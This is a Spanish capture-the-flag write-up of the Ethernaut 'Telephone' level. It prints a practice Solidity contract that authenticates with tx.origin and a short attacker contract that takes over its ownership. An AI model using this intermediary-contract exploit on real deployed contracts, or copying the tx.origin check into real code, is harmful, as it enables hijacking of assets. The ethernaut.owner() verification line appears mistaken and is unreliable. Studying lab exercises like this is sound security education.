# 4-Telephone

## Objetivo
Obtener el ownership del contrato

## Contrato
```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## Análisis del contrato
* Puede ser compilado con una versión 0.6.0 o superior de Solidity.
* Posee la variable owner del tipo **_address_**
* El constructor, setea al addess que deploya el contrato como su owner.
* Función changeOwner, es pública y recibe como parámetro un address. En esta función se valida si quien origina la transacción (tx.origin) es distinto a quien envía la transacción(msg.sender).
Si esto se cumple se setea como owner el address recibida por parámetro.

## Solución
Dada esa condición de la función changeOwner no podemos llamar directamente. Por lo que tenemos que crear un contrato que llame
esta función por nosotros. De esta forma el tx.origin será nuestra dirección y el msg.sender será la dirección del contrato que hemos creado.

### Contrato hackTelephone
```Solidity
contract hackTelephone {
    Telephone public originalContract = Telephone({{dirección de tu contrato Telephone}});

    function callOwner(address _address)public{
        originalContract.changeOwner(_address);
    }
}
```

Para deployarlo podemos utilizar [Remix](https://remix.ethereum.org/). Una vez deployado, llamamos a la función callOwner de nuestro contrato hackTelephone.
Una vez finalizada la transacción validamos que seamos owner del contrato
```
await ethernaut.owner()
```
Realizamos el submit de la instancia y listo! Quinto reto completado.
